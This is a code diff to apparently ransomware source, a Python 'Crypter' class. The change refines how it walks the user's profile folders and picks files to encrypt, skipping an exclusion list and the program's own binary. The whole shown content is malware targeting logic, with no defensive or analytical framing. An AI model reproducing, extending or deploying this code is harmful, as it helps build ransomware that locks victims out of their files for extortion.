@@ -107,7 +107,7 @@ class Crypter(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    sys._MEIPASS = "..\\build\\images"
+    #sys._MEIPASS = "..\\build\\images"
     crypter_gui = Gui.Gui(
         image_path=sys._MEIPASS, 
         start_time=start_time,
@@ -199,6 +199,7 @@ class Crypter(Base.Base):
     @summary: Searches the file system and builds a list of files to encrypt
     @return: List of files matching the location and filetype criteria
     '''
+    binary_name = os.path.split(sys.argv[0])[1]
 
     base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
     file_list = []
@@ -207,14 +208,22 @@ class Crypter(Base.Base):
       for path,subdirs,files in os.walk(directory):
         for file in files:
           if os.path.isfile(os.path.join(path, file)):
-            # Check extension is valid
-            if self.is_valid_filetype(file):
-              file_list.append(os.path.join(path, file))
+            # Check file is valid
+            if (
+                (self.is_valid_filetype(file)) and
+                (file.lower() not in self.FILES_TO_EXCLUDE) and
+                (file.lower() != binary_name.lower())
+                ):
+                    file_list.append(os.path.join(path, file))
         for file in subdirs:
           if os.path.isfile(os.path.join(path, file)):
-            if self.is_valid_filetype(file):
-              file_list.append(os.path.join(path, file))
-
+            # Check file is valid
+            if (
+                (self.is_valid_filetype(file)) and
+                (file.lower() not in self.FILES_TO_EXCLUDE) and
+                (file.lower() != binary_name.lower())
+                ):
+                    file_list.append(os.path.join(path, file))
 
 
     return file_list
